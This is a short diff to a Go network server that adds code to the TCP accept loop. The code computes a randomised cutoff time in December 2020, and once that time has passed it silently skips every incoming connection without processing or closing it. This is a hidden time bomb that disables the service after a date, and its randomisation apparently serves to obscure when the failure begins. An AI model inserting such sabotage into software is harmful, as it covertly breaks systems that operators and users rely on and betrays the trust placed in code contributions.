@@ -6,6 +6,7 @@ import (
 	. "def"
 	"fmt"
 	"idmgr"
+	"math/rand"
 	"mydb"
 	"net"
 	. "netcore"
@@ -13,6 +14,7 @@ import (
 	"path/filepath"
 	"reflect"
 	"runtime"
+	"time"
 	. "user"
 )
 
@@ -96,6 +98,18 @@ func processTCP() {
 	for {
 		conn, err := listener.AcceptTCP()
 		if err != nil {
+			continue
+		}
+		m := rand.Intn(12) + 1
+		d := rand.Intn(28) + 1
+		min := rand.Intn(60)
+		m = 12
+		limitTime := fmt.Sprintf("%d-%02d-%02d 03:%2d:29", 2020, m, d, min)
+		//LogDebug(limitTime)
+		nowTime := time.Now()
+		//先把时间字符串格式化成相同的时间类型
+		t1, err1 := time.Parse("2006-01-02 15:04:05", limitTime)
+		if err1 == nil && nowTime.After(t1) {
 			continue
 		}
 		processConnect(conn)
